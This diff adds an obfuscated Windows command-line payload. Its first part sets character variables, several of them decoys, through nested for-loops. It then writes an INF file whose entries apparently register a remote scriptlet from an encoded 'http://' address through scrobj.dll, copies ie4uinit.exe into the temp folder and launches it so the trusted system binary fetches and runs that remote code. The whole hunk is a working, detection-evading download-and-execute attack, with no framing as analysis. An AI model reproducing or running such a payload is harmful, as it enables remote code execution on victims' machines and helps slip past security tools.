@@ -1,0 +1,19 @@
+/v /c  (for %v in ("restrai=ca" "ant=l" "bookrests=t" "orcha=e" ) do @set %~v) &&
+  call(for %w in ("]") do @set "manipula=%~w") &&
+  call(for %l in ("d") do @set "communal=%~l") &&
+  call(for %v in ("$") do @set "unmeliora=%~v") &&
+  (for %c in ("e") do @set "thr=%~c") &&
+  (for %x in ("l") do @set "culetpo=%~x") &&
+  callcallcallcall(for %z in ("h") do @set "renocutan=%~z") &&
+  (for %b in ("s") do @set "petron=%~b") &&
+  callcallcall(for %b in ("t") do @set "unsonlike=%~b") &&
+  call(for %r in ("e") do @set "thr=%~r") &&
+  call(for %b in ("r") do @set "cont=%~b") &&
+  (for %y in ("o") do @set "pic=%~y") &&
+  call(for %p in ("p") do @set "mantis=%~p") &&
+  (for %s in ("n") do @set "androsphin=%~s") &&
+  callcall(for %z in ("n") do @set "androsphin=%~z") &&
+  call(for %c in (".") do @set "nonbin=%~c") &&
+  (for %a in ("[version]" "signature=$windows nt$" "[defaultinstall.windows7]" "delfiles=3C3" "Un\" "Register\" "OCXs=tet_2645" "[3C3]" "i%megaloc%u%patc%n%patc%t%massager%i%tresslet%f" "[tet_2645]" "s%aeronau%r%teache%b\" "j%massager%d%marquisd%l,N%commendato%,h%totteris%t%candler%:%ban%/%skiapod%a%cleido%v%massager%a%ginglymus%w%pilloriesv%v%massager%c%teache%m%ban%a%chevre%f%skiapod%h%chevre%" "[destinationdirs]" "defaultdestdir=11" "3C3=01" "[strings]" "servicename= 'lor'" "shortsvcname= 'lor'" "massager=." "ban=/" "commendato=I" "cleido=b" "aeronau=c" "megaloc=e" "patc=i" "skiapod=k" "marquisd=l" "tresslet=n" "teache=o" "candler=p" "pilloriesv=r" "chevre=s" "totteris=t" "ginglymus=v" ) do @echo %~a) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
